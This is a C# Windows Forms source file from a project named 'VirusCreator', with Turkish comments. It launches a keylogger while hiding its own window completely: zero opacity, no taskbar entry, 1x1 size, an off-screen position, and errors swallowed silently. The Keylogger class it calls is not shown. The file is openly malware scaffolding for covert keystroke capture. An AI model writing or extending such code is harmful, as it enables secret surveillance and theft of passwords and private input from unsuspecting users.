using System;
using System.IO;
using System.Windows.Forms;

namespace VirusCreator
{
    public partial class Form1 : Form
    {
        private const string TARGET_FOLDER = "TestFolder";
        private Keylogger keylogger;
        private string testFolderPath;

        public Form1()
        {
            InitializeComponent();
            testFolderPath = Path.Combine(Application.StartupPath, TARGET_FOLDER);
            keylogger = new Keylogger(testFolderPath);
            
            // Formu tamamen şeffaf ve görünmez yap
            this.Opacity = 0;
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;
            this.FormBorderStyle = FormBorderStyle.None;
            this.Size = new System.Drawing.Size(1, 1);
            this.StartPosition = FormStartPosition.Manual;
            this.Location = new System.Drawing.Point(-1000, -1000);
            
            // Keylogger'ı otomatik başlat
            this.Load += Form1_Load;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                if (!Directory.Exists(testFolderPath))
                {
                    Directory.CreateDirectory(testFolderPath);
                }

                keylogger.Start();
                // Form gizli kalacak, sadece keylogger çalışacak
            }
            catch (Exception ex)
            {
                // Hata durumunda sessizce devam et
            }
        }


        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (keylogger != null && keylogger.IsRunning)
            {
                keylogger.Stop();
            }
            base.OnFormClosing(e);
        }
    }
}

